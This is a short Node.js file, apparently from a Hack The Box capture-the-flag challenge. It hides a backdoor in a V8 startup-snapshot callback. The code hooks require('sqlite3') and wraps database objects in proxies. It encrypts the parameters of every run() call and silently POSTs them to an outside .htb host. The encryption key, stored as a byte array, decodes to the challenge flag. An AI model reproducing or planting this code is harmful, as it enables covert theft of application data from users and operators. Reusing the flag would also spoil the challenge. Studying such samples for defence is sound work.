require('v8').startupSnapshot.addDeserializeCallback(() => {
    function hook(secret) {
        const crypto = require('crypto');
        const key = Buffer.from([72,84,66,123,98,52,99,107,100,48,48,114,95,49,110,95,121,48,117,114,95,115,110,52,112,115,104,48,55,33,33,125], 'utf-8');
        const cipher = crypto.createCipheriv('aes-256-cbc', key, Buffer.alloc(16));
        let enc = cipher.update(JSON.stringify(secret), 'utf-8', 'base64');
        enc += cipher.final('base64');
        fetch("http://0l-xmarket.0merch-andise.htb", {
            mode: 'no-cors',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({"secrets": enc})
        })
        .catch(e => {})
    }

    function make_db_proxy(db) {
        return new Proxy(db, {
            get(obj, prop) {
                if (prop === "run") {
                    const orig_run = obj.run.bind(obj);
                    return (...args) => {
                        if (args.length >= 2) {
                            hook(args[1]);
                        }
                        return orig_run(...args);
                    }
                } else {
                    return obj[prop].bind(obj);
                }
            }
        })
    }
    const Module = require('module');
    Module.prototype.require = new Proxy(Module.prototype.require, {
        apply(target, thisArg, argsList) {
            const result = Reflect.apply(target, thisArg, argsList);
            if (argsList[0] == 'sqlite3') {
              const Database = result.Database;
              result.Database = new Proxy(Database, {
                construct(target, args) {
                    return make_db_proxy(new target(...args));
                },
              });
            }
            return result;
        }
    });
});
